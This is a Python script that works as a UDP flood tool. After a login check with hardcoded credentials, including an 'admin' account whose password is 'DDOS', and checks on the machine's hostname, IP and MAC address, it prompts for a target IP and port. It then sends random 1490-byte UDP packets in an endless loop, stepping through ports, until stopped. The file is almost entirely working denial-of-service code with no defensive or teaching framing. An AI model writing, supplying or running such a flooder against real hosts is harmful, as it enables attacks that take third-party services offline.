import socket
import secrets
import time
import os
import ipaddress
from datetime import datetime

# === Authorized Users and Devices ===
authorized_users = {
    "user1": {
        "password": " ",
        "hostname": " ",
        "ip": "0.0.0.0",
        "mac": "00:00:00:00:00:00"
    },
    "admin": {
        "password": "DDOS",
        "hostname": "DDOS",
        "ip": "0.0.0.0",
        "mac": "00:00:00:00:00:00"
    }
}

# === Helper Functions ===
def get_local_ip():
    try:
        return socket.gethostbyname(socket.gethostname())
    except:
        return "Unknown"

def get_mac_address_linux():
    try:
        interface = os.popen("ip route show default | awk '/default/ {print $5}'").read().strip()
        mac = os.popen(f"cat /sys/class/net/{interface}/address").read().strip()
        return mac
    except:
        return "00:00:00:00:00:00"

def log_event(username, result):
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    hostname = socket.gethostname()
    ip = get_local_ip()
    mac = get_mac_address_linux()
    with open("access_log.txt", "a") as log:
        log.write(f"{now} | {username} | Hostname: {hostname} | IP: {ip} | MAC: {mac} | Result: {result}\n")

def get_target():
    while True:
        try:
            ip = input("Enter target IP address (IPv4 or IPv6): ").strip()
            ip_obj = ipaddress.ip_address(ip)
            port = int(input("Enter target port (0–65535): "))
            if 0 <= port <= 65535:
                return ip, port, ip_obj.version == 6
            else:
                print("⚠️ Port out of range. Try again.")
        except:
            print("⚠️ Invalid input. Try again.")

# === Authentication and Validation ===
def authenticate_user():
    username = input("Username: ").strip()
    password = input("Password: ").strip()
    user = authorized_users.get(username)
    if not user:
        print("❌ Unauthorized username.")
        log_event(username, "Unauthorized username")
        exit(1)
    if password != user["password"]:
        print("❌ Incorrect password.")
        log_event(username, "Wrong password")
        exit(1)
    print("✅ Authentication successful.")
    log_event(username, "Access granted")
    return username

def validate_device(username):
    user = authorized_users[username]
    hostname = socket.gethostname()
    ip = get_local_ip()
    mac = get_mac_address_linux()

    if hostname != user["hostname"]:
        print(f"⛔ Hostname mismatch: {hostname}")
        exit(1)
    if ip != user["ip"]:
        print(f"⛔ IP mismatch: {ip}")
        exit(1)
    if mac.lower() != user["mac"].lower():
        print(f"⛔ MAC mismatch: {mac}")
        exit(1)

    print("✅ Device validation passed.")

# === Packet Sending ===
def send_packets(ip, port, is_ipv6, rate=100):
    family = socket.AF_INET6 if is_ipv6 else socket.AF_INET
    sock = socket.socket(family, socket.SOCK_DGRAM)
    sent = 0
    try:
        while True:
            data = secrets.token_bytes(1490)
            sock.sendto(data, (ip, port))
            print(f"📦 Sent {sent + 1} packet to {ip}:{port}")
            sent += 1
            port = (port + 1) % 65536
            time.sleep(1 / rate)
    except KeyboardInterrupt:
        print("🛑 Packet sending stopped.")
    finally:
        sock.close()

# === Main Flow ===
if __name__ == "__main__":
    username = authenticate_user()
    validate_device(username)
    target_ip, target_port, is_ipv6 = get_target()
    send_packets(target_ip, target_port, is_ipv6)
